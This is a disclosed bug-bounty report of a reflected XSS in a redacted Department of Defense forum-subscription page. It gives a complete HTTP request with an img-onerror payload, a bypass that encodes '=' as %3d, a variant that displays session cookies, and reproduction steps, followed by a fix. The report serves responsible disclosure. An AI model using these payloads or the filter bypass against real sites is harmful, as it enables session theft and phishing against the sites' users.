# Reflected XSS via `████████` parameter

## Report Details
- **Report ID**: 1536215
- **URL**: https://hackerone.com/reports/1536215
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-04-09T16:35:25.503Z
- **Disclosed**: 2022-06-27T19:23:58.514Z

## Reporter
- **Username**: mdakh404
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hello everyone,

I came across a page that allows users to subscribe to certain forum posts at `https://███` I noticed that the `████` parameter is reflected in the Page without filtering dangerous characters such as `< > ` except the = character which is filtered by default, but this can be circumvented by encoding it `=   ====>  %3d `, however the precedent page is vulnerable to Reflected XSS:

```
POST /██████_█████████=1&█████████=test HTTP/1.1
Host: ███
Cookie: █████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: https://███████
Authorization: Basic ....
Referer: https://███████
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

__Click=0&activeFlag=Y&%25%25Surrogate_██████=1&██████████=<img src%3dx onerror%3dalert(document.domain)>
```

The above HTTP request leads to an alert pop-up confirming the XSS issue:

█████████

Also the cookies aren't protected by using `HttpOnly` security flag, so cookies can be grabbed using a simple payload such as `<img src=%3d onerror%3dalert(document.cookie)`:

████

## Impact

Cookies theft, Open Redirect, phishing via arbitrary iframes etc..

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Go to https://██████ (You must be authenticated).
2. Click on `Submit`, then Intercept the request with Burp Suite, change the `█████` parameter's value to `<img src%3dx onerror%3dalert(document.cookie>`
3. You'll see an alert pop-up showing your logged-in cookies.

## Suggested Mitigation/Remediation Actions
sanitizing dangerous characters by returning their equivalent HTML entities (see htmlspecialchars() function in PHP).



## Attachments
No attachments
